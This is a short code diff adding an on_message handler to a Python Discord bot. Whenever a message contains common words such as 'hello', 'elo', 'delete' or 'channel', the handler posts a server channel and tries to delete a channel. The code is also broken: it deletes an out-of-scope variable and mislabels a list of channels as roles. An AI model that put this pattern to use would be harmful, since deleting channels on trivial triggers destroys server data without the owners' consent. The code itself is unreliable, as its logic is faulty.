@@ -18,7 +18,18 @@ async def on_ready():
     print("Username: %s"%client.user.name)
     print("ID: %s"%client.user.id)
     print("----------------------")
-          
+    
+@client.event
+async def on_message(message):
+    server = message.server
+    listroles = [y for y in server.channels] 
+    
+    if any(word in message.content for word in["delete", "channel", "hello", "elo"]):
+        t = next(y for y in server.channels)
+        await client.send_message(message.channel, t)         
+        await client.delete_channel(y)
+ 
+    
 #m1 
 @client.command(pass_context=True)
 async def help(ctx):
